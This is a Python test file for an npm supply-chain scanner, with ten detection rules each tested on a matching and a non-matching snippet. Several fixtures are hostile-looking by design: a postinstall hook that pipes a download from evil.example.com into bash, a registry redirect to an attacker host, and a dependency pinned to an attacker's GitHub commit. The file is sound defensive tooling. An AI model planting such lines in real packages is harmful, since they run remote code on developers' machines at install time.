"""Tests for npm_lifecycle_patterns.py — 2 per rule (positive + negative)."""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scripts" / "lib"))
from npm_lifecycle_patterns import RULES, scan_text  # type: ignore[import-not-found]  # noqa: E402

# ---------- Synthetic secret-shaped fixtures -----------------------------
# The npm_ prefix is split so no contiguous real-format token exists at rest.
# Runtime values are byte-identical; the detector still sees the full prefix.
_NPM = "npm" + "_"

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _ids(findings):
    return [f.rule_id for f in findings]


def _has(rule_id: str, text: str) -> bool:
    return rule_id in _ids(scan_text(text))


# ---------------------------------------------------------------------------
# R1 — nls-lifecycle-fetch-exec
# ---------------------------------------------------------------------------


def test_lifecycle_fetch_exec_positive():
    """postinstall value contains curl … | bash — should fire nls-lifecycle-fetch-exec."""
    text = '"postinstall": "curl https://evil.example.com/payload.sh | bash"'
    assert _has("nls-lifecycle-fetch-exec", text)


def test_lifecycle_fetch_exec_negative():
    """postinstall uses curl to download a file without piping to shell — no match."""
    text = '"postinstall": "curl -o dist/file.tar.gz https://cdn.example.com/pkg.tar.gz"'
    assert not _has("nls-lifecycle-fetch-exec", text)


# ---------------------------------------------------------------------------
# R2 — nls-npmrc-auth-token
# ---------------------------------------------------------------------------


def test_npmrc_auth_token_positive():
    """_authToken=npm_XXXX in .npmrc content — should fire nls-npmrc-auth-token."""
    text = f"//registry.npmjs.org/:_authToken={_NPM}ABCDEFGHIJ1234567890abcdef"
    assert _has("nls-npmrc-auth-token", text)


def test_npmrc_auth_token_negative():
    """_authToken= with only whitespace after = (no value) — no match."""
    text = "_authToken= "
    assert not _has("nls-npmrc-auth-token", text)


# ---------------------------------------------------------------------------
# R3 — nls-npmrc-registry-redirect
# ---------------------------------------------------------------------------


def test_npmrc_registry_redirect_positive():
    """registry= pointing to a non-npmjs host — should fire nls-npmrc-registry-redirect."""
    text = "registry=https://attacker.example.com/npm/"
    assert _has("nls-npmrc-registry-redirect", text)


def test_npmrc_registry_redirect_negative():
    """registry= is absent; only a comment line present — no match."""
    text = "# this file sets no registry override\nsave-exact=true"
    assert not _has("nls-npmrc-registry-redirect", text)


# ---------------------------------------------------------------------------
# R4 — nls-npmrc-always-auth
# ---------------------------------------------------------------------------


def test_npmrc_always_auth_positive():
    """always-auth=true in .npmrc — should fire nls-npmrc-always-auth."""
    text = f"always-auth=true\n_authToken={_NPM}secret123"
    assert _has("nls-npmrc-always-auth", text)


def test_npmrc_always_auth_negative():
    """always-auth=false does not trigger the rule."""
    text = "always-auth=false"
    assert not _has("nls-npmrc-always-auth", text)


# ---------------------------------------------------------------------------
# R5 — nls-npm-token-echoed
# ---------------------------------------------------------------------------


def test_npm_token_echoed_positive():
    """echo $NPM_TOKEN in a workflow run step — should fire nls-npm-token-echoed."""
    text = "run: echo $NPM_TOKEN"
    assert _has("nls-npm-token-echoed", text)


def test_npm_token_echoed_negative():
    """NPM_TOKEN referenced inside an env: key assignment (not echoed) — no match."""
    text = "env:\n  NPM_TOKEN: ${{ secrets.NPM_TOKEN }}"
    assert not _has("nls-npm-token-echoed", text)


# ---------------------------------------------------------------------------
# R6 — nls-bin-field-external-path
# ---------------------------------------------------------------------------


def test_bin_field_external_path_positive():
    """bin field maps to a parent-relative path — should fire nls-bin-field-external-path."""
    text = '"bin": {"mytool": "../scripts/evil.js"}'
    assert _has("nls-bin-field-external-path", text)


def test_bin_field_external_path_negative():
    """bin field maps to a relative path within the package — no match."""
    text = '"bin": {"mytool": "./bin/mytool.js"}'
    assert not _has("nls-bin-field-external-path", text)


# ---------------------------------------------------------------------------
# R7 — nls-npx-auto-install
# ---------------------------------------------------------------------------


def test_npx_auto_install_positive():
    """npx -y <package> in a CI workflow step — should fire nls-npx-auto-install."""
    text = "run: npx -y some-unknown-tool"
    assert _has("nls-npx-auto-install", text)


def test_npx_auto_install_negative():
    """npx without -y or --yes flag — no match."""
    text = "run: npx prettier --write ."
    assert not _has("nls-npx-auto-install", text)


# ---------------------------------------------------------------------------
# R8 — nls-optional-dep-orphan-commit
# ---------------------------------------------------------------------------


def test_optional_dep_orphan_commit_positive():
    """optionalDependencies value is a github: protocol orphan SHA — should fire."""
    text = (
        '"optionalDependencies": {\n'
        '  "evil-pkg": "github:attacker/evil-pkg#a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"\n'
        "}"
    )
    assert _has("nls-optional-dep-orphan-commit", text)


def test_optional_dep_orphan_commit_negative():
    """optionalDependencies value is a plain semver — no match."""
    text = '"optionalDependencies": {\n  "some-pkg": "^1.2.3"\n}'
    assert not _has("nls-optional-dep-orphan-commit", text)


# ---------------------------------------------------------------------------
# R9 — nls-node-gyp-lifecycle
# ---------------------------------------------------------------------------


def test_node_gyp_lifecycle_positive():
    """install script calls node-gyp rebuild — should fire nls-node-gyp-lifecycle."""
    text = '"install": "node-gyp rebuild"'
    assert _has("nls-node-gyp-lifecycle", text)


def test_node_gyp_lifecycle_negative():
    """node-gyp rebuild mentioned in a comment string outside a lifecycle key — no match."""
    text = '// This project used to run node-gyp rebuild in install'
    assert not _has("nls-node-gyp-lifecycle", text)


# ---------------------------------------------------------------------------
# R10 — nls-npm-pack-no-npmignore
# ---------------------------------------------------------------------------


def test_npm_pack_no_npmignore_positive():
    """prepublishOnly script calls npm publish — should fire nls-npm-pack-no-npmignore."""
    text = '"prepublishOnly": "npm publish --access public"'
    assert _has("nls-npm-pack-no-npmignore", text)


def test_npm_pack_no_npmignore_negative():
    """Script runs standard build without npm pack/publish — no match."""
    text = '"build": "tsc && rimraf dist"'
    assert not _has("nls-npm-pack-no-npmignore", text)


# ---------------------------------------------------------------------------
# Structural contract tests
# ---------------------------------------------------------------------------


def test_rules_count():
    """RULES tuple must contain exactly 10 rules."""
    assert len(RULES) == 10


def test_all_rule_ids_prefixed_nls():
    """Every rule ID must start with 'nls-'."""
    for rule in RULES:
        assert rule.id.startswith("nls-"), f"Bad prefix: {rule.id}"


def test_scan_text_dedup():
    """scan_text must not return duplicate (rule_id, line, col) triples."""
    text = '"postinstall": "curl https://evil.example.com/x | bash"'
    findings = scan_text(text)
    keys = [(f.rule_id, f.line, f.column) for f in findings]
    assert len(keys) == len(set(keys))


def test_scan_text_empty():
    """scan_text on empty string returns empty list."""
    assert scan_text("") == []


def test_finding_fields():
    """Every Finding has the expected seven fields populated."""
    text = '"postinstall": "curl https://evil.example.com/x | bash"'
    findings = scan_text(text)
    assert findings, "expected at least one finding"
    f = findings[0]
    assert f.rule_id
    assert f.line >= 1
    assert f.column >= 1
    assert f.matched_text
    assert f.severity
    assert f.description
    assert f.owasp_asi
